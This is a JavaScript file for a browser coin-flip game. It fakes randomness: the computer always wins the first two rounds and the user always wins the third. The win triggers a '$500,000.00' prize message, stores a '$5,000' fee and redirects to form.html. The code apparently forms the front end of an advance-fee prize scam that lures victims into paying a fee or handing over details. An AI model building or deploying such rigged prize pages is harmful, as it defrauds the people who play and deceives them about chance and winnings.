const flipButton = document.getElementById("flip-button");
const result = document.getElementById("result");
const player1Coin = document.getElementById("player1-coin");
const player2Coin = document.getElementById("player2-coin");
const chooseHead = document.getElementById("choose-head");
const chooseTail = document.getElementById("choose-tail");

let gameCount = 0;
let player1Choice = null;

function enableFlipButton(choice) {
    player1Choice = choice; // Save the player's choice
    flipButton.disabled = false; // Enable the flip button
    result.innerHTML = `Player 1 chose <b>${choice}</b>. Click Flip to play!`; // Show choice
}

// Event listeners for choosing Head or Tail
chooseHead.addEventListener("click", () => {
    enableFlipButton("Heads");
});
chooseTail.addEventListener("click", () => {
    enableFlipButton("Tails");
});

// Handle the flipping logic
flipButton.addEventListener("click", () => {
    gameCount++;
    if (gameCount <= 3) {
        playGame(gameCount);
    } else {
        result.innerText = "Game Over! Please refresh to play again.";
    }
});

function playGame(round) {
    result.innerText = `Round ${round}: Flipping the coin...`;
    player1Coin.textContent = "Flipping...";
    player2Coin.textContent = "Flipping...";
    flipButton.disabled = true;

    setTimeout(() => {
        const randomSide = Math.random() > 0.5 ? "Heads" : "Tails";
        const player2Choice = randomSide === "Heads" ? "Tails" : "Heads";

        player1Coin.textContent = player1Choice;
        player2Coin.textContent = player2Choice;

        let winner;
        if (round === 1 || round === 2) {
            winner = "AI"; // AI wins first 2 rounds
        } else {
            winner = "User"; // User wins the 3rd round
        }

        if (winner === "AI") {
            result.innerHTML = `Round ${round} Winner: <b>Player 2 (AI)</b>`;
        } else {
            const prize = "$500,000.00";
            const fee = "$5,000";
            result.innerHTML = `Round ${round} Winner: <b>Player 1 (User)</b>! You won <b>${prize}</b>!`;

            // Save prize and fee details
            localStorage.setItem("winnerName", "Player 1");
            localStorage.setItem("winnerAmount", prize);
            localStorage.setItem("winnerFee", fee);

            // Show loading and redirect
            setTimeout(() => {
                result.innerHTML += "<br>Loading...";
                setTimeout(() => {
                    window.location.href = "form.html";
                }, 10000);
            }, 2000);
        }

        flipButton.disabled = false;
    }, 2000);
}
